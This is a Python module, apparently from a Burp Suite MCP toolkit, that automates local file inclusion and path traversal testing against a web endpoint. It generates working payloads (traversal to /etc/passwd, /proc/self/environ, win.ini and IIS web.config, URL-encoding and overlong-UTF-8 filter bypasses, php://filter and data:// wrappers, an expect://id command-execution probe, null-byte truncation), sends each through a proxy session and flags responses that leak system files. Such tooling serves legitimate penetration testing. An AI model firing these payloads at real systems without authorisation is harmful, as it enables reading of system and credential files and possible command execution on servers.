"""Edge-case test: test_lfi."""

import asyncio
import base64
import json
import time
import uuid

from burpsuite_mcp import client

async def test_lfi_impl(
    session: str,
    path: str,
    parameter: str,
    os_type: str = "auto",
    test_wrappers: bool = True,
    depth: int = 6,
) -> str:
    """Test for LFI/path traversal with encoding bypasses and PHP wrappers.

    Args:
        session: Session name
        path: Endpoint path
        parameter: File parameter name
        os_type: 'linux', 'windows', or 'auto'
        test_wrappers: Test PHP stream wrappers
        depth: Traversal depth
    """
    # Clamp depth to a sane range — depth=0 produced "etc/passwd" with no
    # traversal, silently sending a no-op probe.
    depth = max(2, min(depth, 20))
    # The "double-dot filter bypass" probe needs at least 2 segments.
    double_dot_segments = max(1, depth // 2)
    payloads = []
    traversal = "../" * depth

    # Linux payloads
    if os_type in ("auto", "linux"):
        payloads.extend([
            (f"{traversal}etc/passwd", "linux", "Basic traversal"),
            (f"{'..%2f' * depth}etc%2fpasswd", "linux", "URL-encoded slash"),
            (f"{'..%252f' * depth}etc%252fpasswd", "linux", "Double URL-encoded"),
            (f"{'....//..../' * double_dot_segments}etc/passwd", "linux", "Double-dot filter bypass"),
            (f"{'..%c0%af' * depth}etc/passwd", "linux", "UTF-8 overlong encoding"),
            ("/etc/passwd", "linux", "Absolute path"),
            (f"{traversal}proc/self/environ", "linux", "Process environment"),
        ])

    # Windows payloads
    if os_type in ("auto", "windows"):
        win_traversal = "..\\" * depth
        payloads.extend([
            (f"{win_traversal}windows\\win.ini", "windows", "Backslash traversal"),
            (f"{traversal}windows/win.ini", "windows", "Forward slash traversal"),
            (f"{'..%5c' * depth}windows%5cwin.ini", "windows", "URL-encoded backslash"),
            (f"{'..%255c' * depth}windows%255cwin.ini", "windows", "Double URL-encoded backslash"),
            (f"{win_traversal}inetpub\\wwwroot\\web.config", "windows", "IIS web.config"),
        ])

    # PHP wrappers
    if test_wrappers:
        payloads.extend([
            ("php://filter/convert.base64-encode/resource=index", "wrapper", "php://filter base64"),
            ("php://filter/convert.base64-encode/resource=../config", "wrapper", "php://filter config"),
            ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "wrapper", "data:// phpinfo"),
            ("expect://id", "wrapper", "expect:// command exec"),
            (f"{traversal}etc/passwd%00.png", "null_byte", "Null byte truncation"),
        ])

    # Baseline
    sep = "&" if "?" in path else "?"
    baseline_resp = await client.post("/api/session/request", json={
        "session": session, "method": "GET", "path": path,
    })
    baseline_length = baseline_resp.get("response_length", 0) if "error" not in baseline_resp else 0

    # Linux/Windows indicators.
    # Strong /etc/passwd markers only — "/bin/bash", "/bin/sh", "daemon:" alone
    # false-positive on docs, man pages, or any shell-scripting content.
    linux_indicators = ["root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
                        "nobody:x:", "daemon:x:1:"]
    windows_indicators = ["[fonts]", "[extensions]", "for 16-bit app", "[mail]"]
    # Wrapper markers: "<?php" decoded prefix (PD9waH), "<!DOCTYPE" decoded
    # prefix (PCFET0). "eyJ" dropped — it's the base64 prefix of every JWT
    # token, so false-positives on any page that renders JWTs.
    wrapper_indicators = ["PD9waH", "PCFET0"]

    lines = [f"LFI/Path Traversal Test: {parameter} on {path}\n"]
    lines.append(f"OS: {os_type} | Depth: {depth} | Wrappers: {test_wrappers}")
    lines.append(f"Baseline length: {baseline_length}B\n")
    lines.append(f"{'PAYLOAD':<55} {'STATUS':<8} {'LEN':<8} {'RESULT'}")
    lines.append("-" * 110)
    vulns = []

    for payload, ptype, desc in payloads:
        inject_path = f"{path}{sep}{parameter}={payload}"
        resp = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": inject_path,
        })
        if "error" in resp:
            lines.append(f"{desc:<55} {'ERR':<8} {'?':<8} Error")
            continue

        status = resp.get("status", 0)
        length = resp.get("response_length", 0)
        body = resp.get("response_body", "")

        # Check indicators
        vulnerable = False
        result = "No match"

        if ptype == "linux":
            matched = [i for i in linux_indicators if i in body]
            if matched:
                vulnerable = True
                result = f"VULNERABLE ({', '.join(matched)})"
        elif ptype == "windows":
            matched = [i for i in windows_indicators if i.lower() in body.lower()]
            if matched:
                vulnerable = True
                result = f"VULNERABLE ({', '.join(matched)})"
        elif ptype == "wrapper":
            # Check for base64 content or phpinfo
            if any(ind in body for ind in wrapper_indicators):
                vulnerable = True
                result = "VULNERABLE (wrapper content)"
            elif "phpinfo" in body.lower() or "<title>phpinfo()" in body:
                vulnerable = True
                result = "VULNERABLE (phpinfo)"
        elif ptype == "null_byte":
            matched = [i for i in linux_indicators if i in body]
            if matched:
                vulnerable = True
                result = f"VULNERABLE (null byte bypass)"

        # Length anomaly
        if not vulnerable and status == 200 and baseline_length > 0:
            diff_pct = abs(length - baseline_length) / baseline_length * 100 if baseline_length else 0
            if diff_pct > 50 and length > baseline_length:
                result = f"ANOMALY (+{diff_pct:.0f}% length)"

        if vulnerable:
            vulns.append(desc)

        payload_display = desc[:53] + ".." if len(desc) > 53 else desc
        marker = " ***" if vulnerable else ""
        lines.append(f"{payload_display:<55} {status:<8} {length:<8} {result}{marker}")

    lines.append("")
    if vulns:
        lines.append(f"*** {len(vulns)} LFI/path traversal vulnerabilities found ***")
        for v in vulns:
            lines.append(f"  -> {v}")
    else:
        lines.append("No LFI/path traversal detected.")

    return "\n".join(lines)
